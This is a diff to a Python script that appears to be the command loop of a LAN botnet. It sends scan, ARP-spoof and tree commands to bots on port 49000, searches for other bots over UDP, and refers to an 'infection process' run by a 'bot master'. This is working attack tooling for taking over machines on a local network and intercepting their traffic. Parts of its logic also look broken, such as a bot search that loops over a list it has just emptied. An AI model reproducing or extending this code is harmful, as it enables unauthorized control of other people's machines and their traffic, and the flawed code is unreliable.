@@ -22,7 +22,8 @@ def convert(choice):
 
 
 # handles all the commands
-def handle_command(data, clients):
+def handle_command(data):
+    global choice, clients
     if data == "scan":
         parent_conn.send(data)
         clients = parent_conn.recv()
@@ -33,7 +34,7 @@ def handle_command(data, clients):
         # else:
         #     print("scan failed")
         choice = "scan_result"
-        return clients, choice
+        return clients
 
     elif data.find("scan:") != -1:
         parent_conn.send(data)
@@ -41,7 +42,7 @@ def handle_command(data, clients):
         # print(mac)
         choice = "scan_result:"
         clients.append({'ip': data.split(":")[1], 'mac': mac})
-        return mac, choice
+        return mac
 
     elif data.find("spoof:") != -1:
         chosen_ip = data.split(":")[1]
@@ -54,37 +55,31 @@ def handle_command(data, clients):
         parent_conn.send(chosen_mac)
         result = parent_conn.recv()
         choice = "spoof_result"
-        return result, choice
+        return result
 
     elif data == "get_tree":
         choice = "tree_result"
-        return lan_tree, choice
+        return lan_tree
 
 
 # handles all the command's results (sends back to the bot master)
-def handle_command_result(sock, data, output):
+def handle_command_result(data, output):
     if data == "scan_result":
+        print("IP" + " " * 15 + "MAC")
         if output:
-            string = "IP" + " " * 15 + "MAC"
             for client in output:
-                string += "\n" "{}   {}".format(client['ip'], client['mac'])
-            print(string)
-            sock.send(string.encode())
+                print("{}   {}".format(client['ip'], client['mac']))
         else:
-            sock.send("scan failed".encode())
+            print("scan failed")
 
     elif data == "scan_result:":
-        sock.send(output.encode())
+        print(output)
 
     elif data == "spoof_result":
-        print("infected")
+        print(output)
 
     elif data == "tree_result":
-        hosts = ""
-        for host in output:
-            hosts += host + " "
-        print(hosts)
-        sock.send(hosts.encode())
+        print(output)
 
 
 # sends to the entire network message to check for other bots
@@ -130,27 +125,13 @@ def ip_list():
     return ips
 
 
-def con_thread(sock, addr):
-    choice = ""
-    data = ""
-    output = ""
-    clients = []
-    while True:
-        if choice == "":
-            choice = sock.recv(1024).decode()
-
-        data = choice
-        data_type = convert(choice)
-        choice = ""
-
-        if not data_type:
-            print("invalid instruction")
-
-        else:
-            if data_type == Types.COMMAND:
-                output, choice = handle_command(data, clients)
-            elif data_type == Types.COMMAND_RESULT:
-                handle_command_result(sock, data, output)
+# search for all the active bots in LAN
+def search_bots():
+    global lan_tree
+    lan_tree = []
+    for bot in lan_tree:
+        master_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        master_socket.sendto("####".encode(), (bot, 48000))
 
 
 if __name__ == '__main__':
@@ -171,6 +152,11 @@ if __name__ == '__main__':
     can_infect = False
     # creating a duplex pipe for the IPC
     parent_conn, child_conn = multiprocessing.Pipe()
+    choice = ""
+    data = ""
+    output = ""
+    clients = []
+    connections = []
 
     # tries to spawn the infection process
     try:
@@ -185,10 +171,61 @@ if __name__ == '__main__':
 
     tcp_socket = socket.socket()
     tcp_socket.bind(("0.0.0.0", 49000))
-    tcp_socket.listen()
 
     # waiting for command (later receives from bot master)
     while True:
-        (client_socket, client_address) = tcp_socket.accept()
-        con_th = threading.Thread(target=con_thread, args=(client_socket, client_address,))
-        con_th.start()
+        if choice == "":
+            choice = input("ins")
+
+        elif choice.find("master") == -1:
+            data = choice
+            data_type = convert(choice)
+            choice = ""
+
+            if not data_type:
+                print("invalid instruction")
+
+            else:
+                if data_type == Types.COMMAND:
+                    output = handle_command(data)
+                elif data_type == Types.COMMAND_RESULT:
+                    handle_command_result(data, output)
+        else:
+            master_command = choice.split(".")[1]
+            choice = ""
+            if master_command == "search_bots":
+                search_bots()
+            elif master_command == "get_tree":
+                print(lan_tree)
+            elif master_command == "get_bot_tree":
+                botip = input("enter bot ip (q to quit)")
+                if botip != "q":
+                    try:
+                        if botip not in connections:
+                            tcp_socket.connect((botip, 49000))
+                        tcp_socket.send("get_tree".encode())
+                        print(tcp_socket.recv(1024).decode())
+                        connections.append(botip)
+                    except Exception as e:
+                        print(str(e))
+            elif master_command == "show_entire_network":
+                pass
+            elif master_command == "send_command":
+                botip = input("enter bot ip (q to quit)")
+                if botip != "q":
+                    try:
+                        if botip not in connections:
+                            tcp_socket.connect((botip, 49000))
+                            connections.append(botip)
+                        command = input("enter command")
+                        if command.find("scan") != -1:
+                            tcp_socket.send(command.encode())
+                            print(tcp_socket.recv(1024).decode())
+                        if command == "spoof":
+                            tcp_socket.send(command.encode())
+                    except Exception as e:
+                        print(str(e))
+                pass
+            # elif master_command == "show_scan":
+            #     pass
+
